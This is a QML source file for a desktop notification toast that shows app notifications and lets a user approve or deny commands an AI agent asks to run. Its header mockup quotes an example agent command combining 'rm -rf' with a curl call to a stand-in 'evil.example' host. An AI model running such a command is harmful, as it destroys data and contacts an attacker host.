// HeraldBody.qml — everything the cadenza herald toast draws (intent §3.7).
//
//     herald ▸ claude · SUMMONS                 14:02
//     minerva-owl wants to run a command
//     “Bash: rm -rf target/ && curl https://evil.example/…”
//     [y] approve  [n] deny
//
//     herald ▸ firefox                          14:02
//     Download finished
//     “<b>report.pdf</b> — open https://…”
//
// Borderless blocks (kit `Block`) stacked top-right under the bar, the
// transient cousin of the board's NOTIF tab: the same `herald ▸ <app>` label,
// the same quoted plain body, the same `[y] approve [n] deny` words.
//
// A HELPER (uppercase — never a slot). `herald.qml` is the thin PanelWindow
// shell (namespace, layer, anchors, visibility) and loads this body BY URL
// (design/kit.md §1); the preview canvas loads it directly, since the canvas
// refuses a PanelWindow root.
//
// ── DATA ──────────────────────────────────────────────────────────────────
// Read-only: `state/stage/herald.json` (CONTRACTS §4), watched. Newest is
// LAST in the file. The stage dir resolves exactly as BoardBody's does
// (AOIDE_STAGE_DIR / AOIDE_STATE_DIR, else under AOIDE_ROOT). Sender text is
// UNTRUSTED DATA (house rule 4): every Text is PlainText, control characters
// are flattened, the body is quoted and wrapped, nothing is linkified or
// actionable.
//
// ── THE DISMISS CLOCK (sonata herald.qml's contract) ──────────────────────
// The toast owns expiry. Each record carries `timeoutMs` (0 = never — every
// summons and every critical). A lapsed record leaves the toast but stays in
// the file for the board's NOTIF tab; nothing daemon-side expires it.
// Deadlines are pinned per (id, receivedAt) at first sight, so a rewrite of
// the file (another arrival) never restarts a toast's clock, and a new
// arrival reusing an id (dunst's stack_duplicates) gets a fresh one.
//
// ── THE WIRE (the only two commands, sonata's exact shapes) ───────────────
//   click a toast              → { cmd: "heralddismiss", id: <record id> }
//   [y] / [n] on a summons     → { cmd: "heraldverdict", id: <sessionId>,
//                                  verdict: "approve" | "deny" }
// A summons clicked off its [y]/[n] is only waved off the screen (a local
// lapse): the agent behind it is still blocked, so it stays on the board.
//
// ── NO KEYBOARD ───────────────────────────────────────────────────────────
// The toast never takes keyboard focus: a `y` typed into an editor must
// never approve a command. `[y]`/`[n]` are the board's key words, drawn as
// click targets here; the board's NOTIF tab answers them by key.
//
// ── COLOUR ────────────────────────────────────────────────────────────────
// Label dim; a summons or a critical record's label is `urgent` red (a
// summons waiting on you). Summary `ink` (`bright` on a summons), the quoted
// body `mid`, progress `number`. At rest nothing is amber; only the hovered
// `[y]`/`[n]` key letter turns `hot`. No images: the terminal draws words.
// At rest nothing moves — a toast appears whole and leaves whole.
import QtQuick
import Quickshell
import Quickshell.Io
import "Kit.js" as Kit

Item {
    id: root

    required property var livery
    property var bridge: null

    FontMetrics { id: fm; font: Kit.bodyFont(13) }
    readonly property var kit: Kit.make(root.livery, fm)

    component Use: Loader {
        required property var kit
        required property string helper
        property var props: ({})
        Component.onCompleted: {
            var p = { kit: Qt.binding(() => kit) }
            for (var k in props) p[k] = props[k]
            setSource(kit.helper(helper), p)
        }
    }

    // ── geometry, in cells ────────────────────────────────────────────────
    readonly property int cols: 40          // inner width of one block
    readonly property int maxBlocks: 4      // older unlapsed records wait on the board
    // the shell reads these for its margins: one cell in from the right,
    // half a line under the bar
    readonly property int edgeX: Math.round(kit.cellW)
    readonly property int edgeY: Math.round(kit.cellH / 2)

    // ── paths (BoardBody's resolution) ────────────────────────────────────
    readonly property string rootDir: Quickshell.env("AOIDE_ROOT") || (Quickshell.env("HOME") + "/.aoide")
    readonly property string stateDir: {
        var p = Quickshell.env("AOIDE_STATE_DIR") || ""
        return p.charAt(0) === "/" ? p : root.rootDir + "/state"
    }
    readonly property string stageDir: {
        var p = Quickshell.env("AOIDE_STAGE_DIR") || ""
        return p.charAt(0) === "/" ? p : root.stateDir + "/stage"
    }

    property var records: []
    FileView {
        id: heraldFile
        path: root.stageDir + "/herald.json"
        watchChanges: true; blockLoading: false; printErrors: false
        onFileChanged: reload()
        onLoaded: {
            var d = null
            try { d = JSON.parse(heraldFile.text()) } catch (e) { return }   // garbage → hold what we have
            root.ingest((d && d.notifications) ? d.notifications : [])
        }
        onLoadFailed: root.ingest([])
    }

    // ── the dismiss clock: one map, one sweep while anything shows ────────
    property var deadlines: ({})    // id → epoch-ms deadline, 0 = never
    property var lapsed: ({})       // id → true once off the screen
    property var arrivals: ({})     // id → receivedAt of the tracked arrival
    property int epoch: 0           // bumped to re-run `shown`

    function ingest(arr) {
        var now = Date.now(), dl = {}, lp = {}, av = {}
        for (var i = 0; i < arr.length; i++) {
            var r = arr[i]
            if (!r || r.id === undefined) continue
            var id = "" + r.id
            var at = "" + (r.receivedAt || "")
            var same = root.arrivals[id] !== undefined && root.arrivals[id] === at
            var t = (r.timeoutMs !== undefined) ? (r.timeoutMs | 0) : 0
            dl[id] = (same && id in root.deadlines) ? root.deadlines[id] : (t > 0 ? now + t : 0)
            if (same && root.lapsed[id]) lp[id] = true
            av[id] = at
        }
        root.deadlines = dl; root.lapsed = lp; root.arrivals = av
        root.records = arr
        root.epoch++
    }
    Timer {
        interval: 500; repeat: true
        running: root.count > 0
        onTriggered: {
            var now = Date.now(), lp = root.lapsed, changed = false
            for (var id in root.deadlines) {
                var d = root.deadlines[id]
                if (d > 0 && now >= d && !lp[id]) { lp[id] = true; changed = true }
            }
            if (changed) { root.lapsed = lp; root.epoch++ }
        }
    }

    // unlapsed records: summonses first (each waits on you), then newest
    // first — the board's NOTIF order, so the two read alike
    readonly property var live: {
        var e = root.epoch
        var sum = [], rest = [], r = root.records || []
        for (var i = r.length - 1; i >= 0; i--) {
            if (!r[i] || r[i].id === undefined || root.lapsed["" + r[i].id]) continue
            if (r[i].kind === "summons") sum.push(r[i]); else rest.push(r[i])
        }
        return sum.concat(rest)
    }
    readonly property var shown: root.live.slice(0, root.maxBlocks)
    readonly property int count: root.shown.length
    readonly property int overflow: root.live.length - root.shown.length

    // ── the wire ──────────────────────────────────────────────────────────
    function dismiss(id) {
        if (root.bridge) root.bridge.sendCommand({ cmd: "heralddismiss", id: "" + id })
    }
    function verdict(sessionId, word) {
        if (root.bridge) root.bridge.sendCommand({ cmd: "heraldverdict", id: "" + sessionId, verdict: word })
    }
    function wave(id) {
        var lp = root.lapsed
        lp["" + id] = true
        root.lapsed = lp
        root.epoch++
    }

    // ── text helpers ──────────────────────────────────────────────────────
    function flat(s) { return ("" + (s === undefined || s === null ? "" : s)).replace(/[\u0000-\u001f\u007f]+/g, " ") }
    function hhmm(iso) {
        var t = Date.parse("" + (iso || ""))
        if (isNaN(t)) return ""
        var d = new Date(t)
        return (d.getHours() < 10 ? "0" : "") + d.getHours() + ":" + (d.getMinutes() < 10 ? "0" : "") + d.getMinutes()
    }

    implicitWidth: root.kit.cells(root.cols + 2)
    implicitHeight: stack.implicitHeight

    Column {
        id: stack
        width: root.implicitWidth
        spacing: Math.round(root.kit.cellH / 2)

        Repeater {
            model: root.shown
            Use {
                id: rec
                required property var modelData
                readonly property var r: modelData
                readonly property bool summons: r.kind === "summons"
                readonly property bool critical: ("" + r.urgency) === "critical"
                readonly property int progress: (r.progress !== undefined && r.progress !== null) ? (r.progress | 0) : -1
                width: stack.width
                kit: root.kit; helper: "Block"
                props: ({
                    cols: root.cols,
                    label: "herald ▸ " + root.flat(rec.r.app || "?") + (rec.summons ? " · SUMMONS" : ""),
                    tone: (rec.summons || rec.critical) ? root.kit.urgent : root.kit.dim,
                    stamp: root.hhmm(rec.r.receivedAt),
                    content: recBody
                })
                // the whole block is its own dismiss (declared first, under
                // the [y]/[n] targets): a toast is gone, a summons is waved
                MouseArea {
                    anchors.fill: parent
                    z: -1
                    cursorShape: Qt.PointingHandCursor
                    onClicked: rec.summons ? root.wave(rec.r.id) : root.dismiss(rec.r.id)
                }
                Component {
                    id: recBody
                    Column {
                        width: parent ? parent.width : 0
                        Text {
                            width: parent.width
                            text: root.flat(rec.r.summary)
                            elide: Text.ElideRight
                            color: rec.summons ? root.kit.bright : root.kit.ink
                            font: root.kit.font; textFormat: Text.PlainText
                            style: Text.Outline; styleColor: root.kit.withA(color, 0.18)
                        }
                        Text {
                            visible: !!rec.r.body
                            width: parent.width
                            text: "“" + root.flat(rec.r.body) + "”"
                            wrapMode: Text.WrapAnywhere
                            maximumLineCount: 4
                            elide: Text.ElideRight
                            color: root.kit.mid; font: root.kit.font; textFormat: Text.PlainText
                        }
                        // progress: the kit gauge's run — lit in `number`, the track dim
                        Row {
                            visible: rec.progress >= 0
                            readonly property real frac: Math.min(100, Math.max(0, rec.progress)) / 100
                            readonly property var g: root.kit.gaugeText(frac, root.cols - 5)
                            Text { text: parent.g.fill; color: root.kit.number; font: root.kit.font; textFormat: Text.PlainText }
                            Text { text: parent.g.track; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                            Text {
                                text: root.kit.padL(Math.round(parent.frac * 100) + "%", 5)
                                color: root.kit.number; font: root.kit.font; textFormat: Text.PlainText
                            }
                        }
                        Row {
                            visible: rec.summons
                            // [y] approve
                            Item {
                                width: yesRow.implicitWidth; height: yesRow.implicitHeight
                                Row {
                                    id: yesRow
                                    Text { text: "["; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                    Text {
                                        text: "y"; font: root.kit.titleFont; textFormat: Text.PlainText
                                        color: yes.containsMouse ? root.kit.hot : root.kit.bright
                                    }
                                    Text { text: "] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                    Text { text: "approve"; color: root.kit.match; font: root.kit.font; textFormat: Text.PlainText }
                                }
                                MouseArea {
                                    id: yes
                                    anchors.fill: parent
                                    hoverEnabled: true
                                    cursorShape: Qt.PointingHandCursor
                                    onClicked: root.verdict(rec.r.sessionId, "approve")
                                }
                            }
                            Text { text: "  "; font: root.kit.font; textFormat: Text.PlainText }
                            // [n] deny
                            Item {
                                width: noRow.implicitWidth; height: noRow.implicitHeight
                                Row {
                                    id: noRow
                                    Text { text: "["; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                    Text {
                                        text: "n"; font: root.kit.titleFont; textFormat: Text.PlainText
                                        color: no.containsMouse ? root.kit.hot : root.kit.bright
                                    }
                                    Text { text: "] "; color: root.kit.dim; font: root.kit.font; textFormat: Text.PlainText }
                                    Text { text: "deny"; color: root.kit.urgent; font: root.kit.font; textFormat: Text.PlainText }
                                }
                                MouseArea {
                                    id: no
                                    anchors.fill: parent
                                    hoverEnabled: true
                                    cursorShape: Qt.PointingHandCursor
                                    onClicked: root.verdict(rec.r.sessionId, "deny")
                                }
                            }
                        }
                    }
                }
            }
        }

        // more unlapsed than fit: say where they are, never draw them. A
        // block of its own — the toast overlays windows, so no bare text
        Use {
            visible: root.overflow > 0
            width: stack.width
            kit: root.kit; helper: "Block"
            props: ({
                cols: root.cols,
                label: Qt.binding(() => "+" + root.overflow + " more on the board")
            })
        }
    }
}
